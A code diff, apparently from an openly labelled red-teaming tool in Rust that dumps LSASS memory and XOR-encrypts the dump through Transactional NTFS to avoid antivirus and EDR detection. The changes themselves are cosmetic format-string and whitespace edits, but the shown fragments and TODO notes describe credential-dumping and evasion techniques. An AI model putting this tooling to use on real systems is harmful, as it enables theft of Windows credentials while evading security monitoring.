@@ -9,8 +9,8 @@
 //! >  
 //! > -- Peter Watts, Blindsight (2006)  
 //!
-//! Red teaming tool to dump LSASS memory, bypassing common countermeasures. 
-//! It uses Transactional NTFS (TxF API) to transparently encrypt the memory 
+//! Red teaming tool to dump LSASS memory, bypassing common countermeasures.
+//! It uses Transactional NTFS (TxF API) to transparently encrypt the memory
 //! dump, to avoid triggering AV/EDR/XDR.
 //!
 //! # See also
@@ -48,7 +48,7 @@
 //!
 //! # Tested on
 //! * Microsoft Windows 11 with Microsoft Defender Antivirus
-//! 
+//!
 //! # TODO
 //! * Optimize memory usage (simply corrupt "magic bytes" instead of XORing?)
 //! * Use litcrypt2 or similar to encrypt strings locally
@@ -96,7 +96,7 @@ pub fn run(action: &str) -> Result<(), Box<dyn Error>> {
 /// Dump LSASS memory to encrypted output file
 fn dump() -> Result<(), Box<dyn Error>> {
     // Create output file with a random name
-    let path = format!(".\\{}.log", rand_str(8));
+    let path = format!(".\\{rand}.log", rand = rand_str(8));
     println!("[*] Trying to dump to output file: {path}");
     let path = PathBuf::from(path);
     let mut out_file = File::create_new(path)?;
@@ -124,7 +124,7 @@ fn dump() -> Result<(), Box<dyn Error>> {
     };
 
     // Create intermediate output file as a transacted operation
-    let filename = format!(".\\{}.log", rand_str(16));
+    let filename = format!(".\\{rand}.log", rand = rand_str(16));
     let file_ptr = filename.as_ptr() as *mut u16;
     let file_handle = unsafe {
         CreateFileTransactedW(
@@ -163,8 +163,8 @@ fn dump() -> Result<(), Box<dyn Error>> {
     let size = unsafe { GetFileSize(file_handle, None) } as usize;
     let data = unsafe { slice::from_raw_parts_mut(ptr, size) };
     println!(
-        "[*] Encrypting dump and writing {} bytes to disk",
-        data.len()
+        "[*] Encrypting dump and writing {len} bytes to disk",
+        len = data.len()
     );
 
     let mut dump = vec![0u8; size];
@@ -218,8 +218,8 @@ fn decrypt(path: &str) -> Result<(), Box<dyn Error>> {
 
     // Decrypt dump
     println!(
-        "[*] Trying to decrypt {} bytes to output file: {DUMP}",
-        buf.len()
+        "[*] Trying to decrypt {len} bytes to output file: {DUMP}",
+        len = buf.len()
     );
     xor(buf.as_mut_slice(), KEY);
 
